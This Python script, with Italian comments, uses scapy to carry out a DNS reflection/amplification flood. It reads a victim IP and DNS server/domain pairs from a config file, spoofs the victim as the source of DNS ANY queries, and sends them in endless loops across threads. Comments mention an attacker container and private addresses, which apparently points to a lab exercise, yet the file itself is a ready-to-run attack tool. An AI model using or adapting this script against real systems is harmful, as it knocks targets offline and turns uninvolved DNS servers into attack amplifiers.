
 #!/usr/bin/env python

# Il file di configurazione "var_attack.txt" va aggiunto nella stessa cartella di questo script
# Il formato deve essere conforme a questo esempio:
# 10 -> n threads
# x.x.x.x -> IP vittima
# y.y.y.y -> IP dns server
# exampledom.com -> dominio da chiedere a y.y.y.y
# z.z.z.z -> altro dns server
# exampledom1.com -> altro dominio da chiedere a z.z.z.z
# .
# .
# .
#Un file di attacco è già incluso nel repository (e nel container dell'attaccante)




 
from scapy.all import *
from threading import Thread

nameserver = []
domain = []
request = []
var_lettura = open("var_attack.txt", "r").readlines()

target = var_lettura[1].strip()
for i in range(int(var_lettura[0])):
	print(2+(2*i)%(len(var_lettura)-2))
	nameserver.append(var_lettura[2+(2*i)%(len(var_lettura)-2)].strip())
	domain.append(var_lettura[2+((2*i)+1)%(len(var_lettura)-2)].strip())

print(nameserver)
print(domain)

def send_wrap(request):
	while True:
		send(request)
		#send(request2)
		#send(request3)
	
 
# target     = "172.18.77.77" # Target host
# nameserver= "172.18.0.2" # DNS server
# nameserver2 = "172.18.1.3" # DNS server
# nameserver3 = "172.18.2.2" # DNS server
# domain     = "dom.examp.com" # Some domain name like "google.com" etc.
# domain2     = "dom.examp1.com"
# domain3     = "dom.examp2.com"
for i in range(int(var_lettura[0])):
	ip  = IP(src=target, dst=nameserver[i])
	print(ip)
	udp = UDP(dport=53)
	dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain[i], qtype=255))
	request.append((ip/udp/dns))

threads = list()

for index in range(int(var_lettura[0])):
	x = Thread(target=send_wrap, args=(request[index]))
	threads.append(x)
	x.start()



